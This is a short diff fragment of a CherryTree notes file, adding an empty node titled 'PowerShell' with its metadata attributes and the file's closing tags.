+    <node unique_id="278" master_id="0" name="PowerShell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794510692"/>
+  </node>
+</cherrytree>
